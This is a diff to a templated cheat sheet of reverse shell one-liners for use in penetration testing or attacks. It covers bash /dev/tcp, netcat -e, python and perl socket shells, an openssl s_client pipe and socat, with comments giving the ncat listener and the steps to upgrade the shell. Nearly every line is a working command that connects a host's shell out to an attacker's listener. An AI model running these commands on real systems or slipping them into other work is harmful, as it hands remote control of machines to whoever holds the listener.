@@ -2,19 +2,27 @@
 # - https://gtfobins.github.io/#+reverse%20shell
 # - https://medium.com/@honze_net/reverse-shell-and-some-magic-39629ccd0e5c
 # - https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode
+#
+# catch:
+# - rlwrap ncat -C -v -4 -l -p $PORT$ -k
+# - upgrade with: Ctrl-Z, stty raw -echo, fg, reset, export SHELL=bash, export TERM=xterm-256color, stty rows <num> columns <cols>
 
 bash:
   devtcp: bash -i >& /dev/tcp/$HOST$/$PORT$ 0>&1
 
+nc:
+  e: nc -e "/bin/sh -i" $HOST$ $PORT$
+
 python:
   subproc: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$HOST$",$PORT$));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-  pty: python -c 'import socket, os, pty; s=socket.socket(); s.connect(("$HOST$", "$PORT$")); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn("/bin/sh")'
-
-ruby:
-  socket: ruby -rsocket -e'f=TCPSocket.open("$HOST$",$PORT$).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+  pty: python -c 'import socket, os, pty; s=socket.socket(); s.connect(("$HOST$", $PORT$)); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn("/bin/sh")'
 
 perl:
-  connect: perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($PORT$,inet_aton($HOST$)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+  connect: perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($PORT$,inet_aton("$HOST$")))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+openssl:
+  # catch with 'ncat --ssl'
+  s: mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $HOST$:$PORT$ > /tmp/s; rm -f /tmp/s
 
 socat:
   # listener: socat file:$TTY,raw,echo=0 tcp-listen:$PORT$
